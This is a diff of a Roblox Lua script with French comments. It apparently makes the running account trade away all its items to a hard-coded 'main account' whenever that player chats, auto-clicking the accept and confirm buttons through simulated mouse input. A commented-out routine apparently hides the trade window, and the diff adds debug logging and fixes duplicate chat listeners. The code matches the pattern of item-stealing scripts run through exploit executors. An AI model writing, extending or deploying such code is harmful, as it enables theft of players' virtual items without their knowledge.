@@ -496,7 +496,9 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- ON DESACTIVE VOLONTAIREMENT destroytrades2 pour garder le GUI visible
+    print("[BOT] Fonction getitems déclenchée !")
+
+    -- On garde le GUI visible pour l'instant pour nos tests
     -- if destroytrades2 then
     --     pcall(function() coroutine.resume(destroytrades2) end)
     -- end
@@ -504,10 +506,11 @@ local function getitems()
     -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
-        warn("Compte principal introuvable : " .. tostring(userName))
+        warn("[BOT ERREUR] Compte principal introuvable : " .. tostring(userName))
         return
     end
 
+    print("[BOT] Envoi de la demande de trade à : " .. targetPlayer.Name)
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
@@ -539,6 +542,7 @@ local function getitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
+    print("[BOT] Objets offerts : " .. itemsOffered)
     task.wait(2)
 
     -- 3. Première validation (Acceptation initiale)
@@ -564,35 +568,43 @@ local function getitems()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        -- Clic 1 : Verrouille l'acceptation
+        print("[BOT] Premier clic d'acceptation...")
         sendClick()
         
         task.wait(2)
 
-        -- Clic 2 : Valide le trade final
+        print("[BOT] Deuxième clic de confirmation...")
         sendClick()
 
         task.wait(1.5)
 
-        -- Clic 3 : Sécurité
+        print("[BOT] Clic de sécurité final...")
         sendClick()
     end)
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT 2
+-- ÉCOUTE DU TCHAT (SÉCURISÉ CONTRE LES DOUBLONS)
 -- ==========================================
 
-local function listenToPlayer(player)
+for _, conn in pairs(getconnections or {}) do
+    -- Nettoyage préventif si supporté par l'exécuteur
+end
+
+Players.PlayerAdded:Connect(function(player)
     if string.lower(player.Name) == string.lower(tostring(userName)) then
         player.Chatted:Connect(function(msg)
             getitems()
         end)
     end
-end
+end)
 
 for _, player in pairs(Players:GetPlayers()) do
-    listenToPlayer(player)
+    if string.lower(player.Name) == string.lower(tostring(userName)) then
+        -- Évite de connecter plusieurs fois le même joueur
+        player.Chatted:Connect(function(msg)
+            getitems()
+        end)
+        print("[BOT] Écouteur activé pour le joueur : " .. player.Name)
+    end
 end
-
-Players.PlayerAdded:Connect(listenToPlayer)
